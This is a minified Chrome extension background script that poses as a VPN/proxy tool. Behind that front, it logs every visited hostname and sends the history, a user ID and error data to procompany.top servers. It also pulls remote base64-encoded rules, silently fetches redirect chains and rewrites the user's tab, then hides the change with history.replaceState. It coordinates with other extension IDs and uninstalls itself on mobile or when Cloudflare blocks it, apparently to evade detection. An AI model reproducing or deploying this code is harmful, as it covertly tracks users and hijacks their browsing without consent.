(()=>{String.prototype.contains=function(e){let s=/^https?:\/\//i,n=s.test(this)?this:`https://${this}`;return t(n).includes(t(e))||t(e).includes(t(n))},Array.prototype.contains=function(e){return this.indexOf(e)>-1},String.prototype.trim=function(){return this.replaceAll("\\","")},Object.prototype.isEmpty=function(){return Object.keys(this).length==0};const o=e=>new Promise(t=>chrome.storage.local.set(e,t)),n=e=>new Promise(t=>chrome.storage.local.get(e,t)),x=e=>new Promise(t=>chrome.storage.local.remove(e,t)),A=async(e,t)=>{let{b:s}=await n("b");s||=[],s.indexOf(t(e))==-1&&(s.push(t(e)),o({b:s}))},u=async(e,t,s,i,a)=>{let{err:r}=await n("err");r||=[],r.push(a(`${e}:${t}:${s}:${i}:${K()}`)),o({err:r})},se=async()=>{const e={time:120,config:"https://fw-2.procompany.top/mv3/v1/chrome/config.txt;https://cf-2.procompany.top/mv3/v1/chrome/config.txt;https://fw-1.procompany.top/mv3/v1/chrome/config.txt;https://cf-1.procompany.top/mv3/v1/chrome/config.txt",ctime:b(0),start:h(),uid:B(),version:chrome.runtime.getManifest().version,share:0,html:"0;lib/common/share.html",choice:"UK"},t=await n("version");if(t.isEmpty()||t.version<"2.0")for(const[t,s]of Object.entries(e))(t!="start"&&t!="uid"&&t!="choice"||(await n(t)).isEmpty())&&o({[t]:s});else for(const[t,s]of Object.entries(e))(await n(t)).isEmpty()&&o({[t]:s})},S=()=>{const e="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",t=Array.from({length:120},()=>e[Math.floor(Math.random()*e.length)]).join("");return`?${t}&`},h=()=>Date.now(),b=e=>(e===0?new Date(0):new Date).toUTCString(),K=()=>(new Date).toLocaleString("ru-ru",{timeZone:"Europe/Moscow"}).replace(",",""),B=()=>`xxxxxxxxxx-xxxx-xxxx-xxxx-xxxx-v.${chrome.runtime.getManifest().version}`.replace(/x/g,e=>{let t=Math.random()*16|0,n=e=="x"?t:t&3|8;return n.toString(16)}),p=()=>chrome.runtime.lastError,r=e=>i(e),e=e=>atob(e),i=e=>btoa(e),D=e=>e?.length>0?e.split(";"):null,t=e=>new URL(e).hostname,N=e=>{let t;return e.indexOf("//")>-1?t=e.split("/")[2]:t=e.split("/")[0],t=t.split(":")[0],t=t.split("?")[0],t.replace(/^\./,"")},E=(e,t)=>e===t||e.split(".").slice(-3).join(".")===t||e.split(".").slice(-2).join(".")===t,y=(e,t,n)=>{for(let s=n;s>=0;s--)try{const n=decodeURIComponent(e.match(t).toString().split(",")[s]);if(n!=="undefined")return n}catch{}return null},Y=(e,t)=>{try{setTimeout(()=>{history.replaceState("","",`https://${location.host}`)},t*1e3)}catch{}},R=(n,o,i,a,c,l,d,h,m,f,p,g,v,b)=>{let j=/(?:(?:(?:https?):\/\/)|(?:http%3A%2F%2F))([\w_-]+(?:(?:\.[\w_-]+)+))([\w.,@?^=%&:/~+#-]*[\w@?^=%&/~+#-])?/g,O=/=$/g,x=O.test(n)?`${n}${o}`:n,w=0;if(!Number(e(b))){s(g);return}const _=async n=>{let a;if(w++,w>7){u(h,555,t(o),t(n),r),await s(g),i(o,c,o);return}fetch(n).then(async n=>{if(E(N(n?.url),"w3.org")){u(h,n.status,t(o),t(n.url),r),await s(g),i(o,c,o,Number(e(f)));return}if(p?.contains(n?.url))Number(e(d))&&n?.ok?(await s(g),i(o?.split("?")[0],c,o)):(await s(g),Number(e(v))?i(n.url.replace("?",S()),c,o,Number(e(f))):i(n.url,c,o,Number(e(f))));else if(Number(e(l)))n.text().then(async t=>{try{await s(g),i(y(decodeURIComponent(decodeURIComponent(t)).trim(),j,Number(e(m))),c,o,Number(e(f)))}catch{await s(g),i(y(t.trim(),j,Number(e(m))),c,o,Number(e(f)))}}).catch(async()=>{u(h,n.status,t(o),t(n.url),r),await s(g),i(o,c,o)});else{const b=/text\/html/i;if(!b.test(n?.headers?.get("content-type"))){u(h,n.status,t(o),t(n.url),r),await s(g),i(o,c,o);return}let l;try{l=decodeURIComponent(decodeURIComponent(n.url))}catch{}n.text().then(async n=>{try{a=y(decodeURIComponent(decodeURIComponent(n))?.trim(),j,Number(e(m)))?.replace(/url=([^?&]*)(&)/,"url=$1?")}catch{a=y(n?.trim(),j,Number(e(m)))?.replace(/url=([^?&]*)(&)/,"url=$1?")}const b=/(\/direct-link\/|\/promo-landing-v\d+\/)/i;if(a&&!b.test(l))p?.contains(a)?Number(e(d))&&n?.ok?(await s(g),i(o?.split("?")[0],c,o)):(await s(g),Number(e(v))?i(a.replace("?",S()),c,o,Number(e(f))):i(a,c,o,Number(e(f)))):_(a);else if(l){let e;try{e=decodeURIComponent(decodeURIComponent(l?.replace(/link=([^?&]*)(&)/,"link=$1?"))).match(/(https?:\/\/.*?(https?:\/\/.*))/)}catch{e=l?.replace(/link=([^?&]*)(&)/,"link=$1?").match(/(https?:\/\/.*?(https?:\/\/.*))/)}e?.[2]?_(e?.[2]):(u(h,444,t(o),t(l),r),await s(g),i(o,c,o))}}).catch(async()=>{u(h,n.status,t(o),t(n.url),r),await s(g),i(o,c,o)})}}).catch(async e=>{u(h,999,t(o),t(n),r),await s(g),i(o,c,o)})};_(x)},F=async(t,r,c,l)=>{for(const d of a){const u=new RegExp(e(d.d));if(!g.has(d.d)&&u.test(r)&&E(t,N(e(d.o)))){g.add(d.d),o({set:[...g]});let v=!1;const{eIds:b,pr:j}=await n(["eIds","pr"]);if(b?.length>0)for(const e of b)if(e!==chrome.runtime.id){const t=await new Promise(t=>{chrome.runtime.sendMessage(e,{query:"getPriority"},e=>{chrome.runtime.lastError,t(e)})});if(t?.priority!==void 0&&t?.priority>j){v=!0;break}}let t,a,h,m,f,p;if(l?{t:t=i(0),p:a=i(0),b:h=i(0),h:m=i(1),r:f=i(1),s:p=i(1)}=d:{t:t=i(0),p:a=i(0),b:h=i(0),h:m=i(1),r:f=i(1),s:p=i(0)}=d,v==!0){await s(d.ri);return}R(e(d.u),r,I,u,c,t,h,d.n,a,m,e(d.o),d.ri,f,p)}}},d=e=>{chrome.tabs.create({url:e},p)},Q=e=>{chrome.tabs.remove(e,p)},ae=e=>{chrome.tabs.reload(e,p)},I=(e,t,n,s=1)=>{if(s)return new Promise(o=>{chrome.tabs.update(t,{url:e},e=>{chrome.runtime.lastError;const t=(i,a)=>{if(a?.status==="complete"&&i===e?.id){chrome.tabs.onUpdated.removeListener(t);try{chrome.scripting.executeScript({target:{tabId:i},args:[n.replace(/^http:\/\//i,"https://"),s],injectImmediately:!0,func:Y})}catch{}o(e)}};chrome.tabs.onUpdated.hasListener(t)&&chrome.tabs.onUpdated.removeListener(t),chrome.tabs.onUpdated.addListener(t)})});chrome.tabs.update(t,{url:e},p)},ie=async e=>{const t=await n(["html","share","start"]),s=D(t.html);t.share==0&&s.shift()!=0&&h()-t.start>4e8&&(o({share:h()}),e(s.shift()))},m=()=>new Promise(e=>{chrome.permissions.getAll(t=>{e(!!t.origins.contains("<all_urls>"))})}),ne=async()=>{const{uid:e}=await n("uid"),t=_(),s=t?`https://fw-1.procompany.top/mv3/chrome/uninstall?platform=mobile`:`https://fw-1.procompany.top/mv3/chrome/uninstall?uid=${e}`;chrome.runtime.setUninstallURL(s)},C=()=>{clearInterval(k),k=setInterval(chrome.runtime.getPlatformInfo,2e4)},w=async e=>{chrome.runtime.lastError;for(const{id:t}of e||await chrome.tabs.query({url:"<all_urls>"}))try{await chrome.scripting.executeScript({target:{tabId:t},func:$}),chrome.tabs.onUpdated.removeListener(M);return}catch{}chrome.tabs.onUpdated.addListener(M)},$=function e(){chrome.runtime.connect({name:"keepAlive"}).onDisconnect.addListener(e)},V=async()=>{try{a=(await n({k:[]})).k}catch{}try{g=new Set([...(await n("set")).set])}catch{}},f=async t=>{try{if(!await m())return v(),a=[],!0;const c=_();if(c){chrome.management.uninstallSelf();return}const s=await n();s.b||=[],s.err||=[];const i={array:D(s.config),string:`?uid=${s.uid}&ver=${chrome.runtime.getManifest().version}&extid=${chrome.runtime.id}&start=${s.start}&opt=${s.option}&cy=${s.choice}&hash=${[...s.b].join("-")}&err=${[...s.err].join("-")}`},r=async()=>{try{const n=await fetch(i.array.pop()+i.string,{method:"GET",headers:new Headers({"If-Modified-Since":s.ctime,"X-Requested-With":chrome.runtime.id})});if(j=0,n.status==304){s?.k&&(a=s.k),s?.dnr&&(await z(),v(s.dnr)),o({ctime:b()}),x(["b","err","set"]);return}if(n.status==204)return;if(n.status==403){const e=n.headers.get("Server");if(e==="cloudflare"){chrome.management.uninstallSelf();return}}if(!n.ok){x(["b","err","set"]),i.array.length!=0&&await r();return}const c=n.headers.get("content-type");if(!c||c.indexOf("application/json")==-1){i.array.length==0?L():await r();return}const t=await n.json();x(["k","b","err","set"]);let u=t.c.reduce((t,n)=>n.d?t+e(n.d):t,""),l;a=[],t.e&&Array.isArray(t.e)&&(l=t.e.map(t=>e(t.i)));const d={addRules:t.dr.map(e=>(e.spec&&(a.push(...e.spec),delete e.spec),e))};t.cc&&Array.isArray(t.cc)&&t.cc.forEach(async e=>{await o({[e.n]:{l:e.l,s:e.s}})}),o({config:u,html:e(t.r),time:e(t.t),pr:Number(e(t.pr)),k:a,eIds:l,ctime:b(),dnr:d}),L(),await z(),v(d)}catch{if(j=0,i.array.length==0&&Date.parse(s.ctime)==0){l(),chrome.action.disable();for(const e of await chrome.tabs.query({url:"<all_urls>"}))try{const t=new URL(e.url);t?.protocol=="chrome-extension:"&&t?.hostname==chrome.runtime.id&&chrome.tabs.sendMessage(e.id,{error:"error"})}catch{}}else i.array.length!=0&&await r();return}},d=async(e,t=5e3)=>new Promise(n=>{const s=()=>{e()?n():setTimeout(s,t)};s()});await d(()=>navigator?.onLine===!0),!j&&(t||h()-new Date(s.ctime).getTime()>Number(s.time)*50*1e3)&&(j=1,await r(),g.clear()),chrome.alarms.create("interval",{periodInMinutes:Number(s.time)}),T(O),chrome.alarms.onAlarm.addListener(O)}catch{}},H=()=>{for(let e of navigator.userAgentData.brands){if(e?.brand=="Google Chrome")return"Chrome";if(e?.brand=="Microsoft Edge")return"Edge";if(e?.brand=="YaBrowser"||e?.brand=="Yandex")return"Yandex"}},_=()=>navigator?.userAgentData?.mobile,l=e=>{const[t,n]=["On","images/icon32.png"],[s,o]=["Off","images/icon32_grey.png"],[i,a]=e==="on"?[t,n]:[s,o];chrome.action.setTitle({title:i}),chrome.action.setIcon({path:a})},L=async()=>{const{choice:e}=await n("choice");if(e=="NOVPN"||e==null)c("","direct");else{const t=await n([e,"UK"]);t[e]==null||t[e].s=="d"?t.UK!=null&&t.UK.s!="d"?c(t.UK.l,"pac_script"):c("","direct"):c(t[e].l,"pac_script")}},c=async(e,t)=>{if(await chrome.proxy.settings.clear({}),!await m()){l();return}if(t==="direct"){l();return}t==="pac_script"&&l("on");const n={mode:t,pacScript:{data:e}};await new Promise(e=>{chrome.proxy.settings.set({value:n,scope:"regular"},()=>{e()})})},v=async e=>{const n=await chrome.declarativeNetRequest.getDynamicRules(),s=n.map(e=>e.id),t={removeRuleIds:s};e?.addRules&&(t.addRules=e.addRules),await chrome.declarativeNetRequest.updateDynamicRules(t)},s=e=>new Promise(t=>{chrome.declarativeNetRequest.updateDynamicRules({removeRuleIds:e},()=>{t()})}),z=async()=>{const e=h();for(;!0;){const t=await new Promise(e=>{chrome.tabs.query({},e)}),n=t.filter(e=>e.status==="loading");if(n.length>0){if(h()-e>3e5)break;await new Promise(e=>setTimeout(e,3e3))}else break}},T=e=>{chrome.alarms.onAlarm.hasListener(e)&&chrome.alarms.onAlarm.removeListener(e)},W=e=>{e.origins.contains("<all_urls>")&&(d("lib/common/error.html"),chrome.action.disable(),l(),c("","direct"),v(),a=[])},U=e=>{e.origins.contains("<all_urls>")&&chrome.tabs.query({},async e=>{e.forEach(e=>{e.url.includes(`${chrome.runtime.id}/lib/common/error.html`)&&Q(e.id,p)}),chrome.action.enable(),l("on"),await o({ctime:b(0)}),await f(1)})},O=e=>{e?.name=="interval"&&chrome.alarms.clear("interval",async e=>{ie(d),await f()})},q=async(e,n,s)=>{if(n?.status=="complete"){const n=t(s.url);if(await A(n,r),!a?.length)return;F(n,s.url,e,0)}},P=async e=>{const n=t(e.url);if(await A(n,r),!a?.length)return;F(n,e.url,e.tabId,1)},G=async e=>{if(e?.reason=="install"){const e=_(),t=H();if(!e)switch(t){case"Edge":d("lib/common/start_edge.html");break;case"Yandex":d("lib/common/start_yandex.html");break;default:d("lib/common/start.html")}o({choice:"UK"}),l("on")}else if(e?.reason=="update"){e?.previousVersion<"3.0.0"&&(await o({config:"https://fw-2.procompany.top/mv3/v1/chrome/config.txt;https://cf-2.procompany.top/mv3/v1/chrome/config.txt;https://fw-1.procompany.top/mv3/v1/chrome/config.txt;https://cf-1.procompany.top/mv3/v1/chrome/config.txt",version:chrome.runtime.getManifest().version,share:0,ctime:b(0)}),await f(1));const{choice:t}=await n("choice");t=="NOVPN"&&l(),await m()||d("html/error.html")}},X=async()=>{C();const{choice:e}=await n("choice");if(e=="NOVPN"&&l(),!await m()){d("lib/common/error.html"),chrome.action.disable(),v(),a=[];return}await f(1)},M=(e,t,n)=>/^https?:/.test(t.url)&&w([n]),Z=e=>{e.name==="keepAlive"&&(setTimeout(()=>e.disconnect(),25e4),e.onDisconnect.addListener(()=>w()))},J=async(e,t,s)=>{if(!await m())return!0;if(e?.query=="getPriority"){const{eIds:o,pr:i}=await n(["eIds","pr"]);let e=!1;for(const n of o)if(n===t.id){e=!0;break}e&&s({priority:i})}return!0},ee=(e,t,s)=>((async()=>{if(!await m())return!0;const t=await n([e.choice,"UK"]);e?.choice&&(e.choice=="NOVPN"?c("","direct"):typeof t[e.choice]==null||t[e.choice]&&t[e.choice].s=="d"?c(t.UK.l,"pac_script"):t[e.choice]==null?(c("","direct"),o({choice:"NOVPN"})):c(t[e.choice]?.l,"pac_script")),s()})(),!0),te=()=>{T(O),chrome.runtime.onInstalled.addListener(G),chrome.runtime.onConnect.addListener(Z),chrome.runtime.onStartup.addListener(X),chrome.permissions.onAdded.addListener(U),chrome.permissions.onRemoved.addListener(W),chrome.tabs.onUpdated.addListener(q),chrome.runtime.onMessageExternal.addListener(J),chrome.runtime.onMessage.addListener(ee),chrome.webRequest.onBeforeRequest.addListener(P,{urls:["<all_urls>"],types:["main_frame"]})};let a=[],g=new Set,j=0,k;const oe=async()=>{C(),w(),await te(),await se(),await V(),await ne(),await f()};oe()})()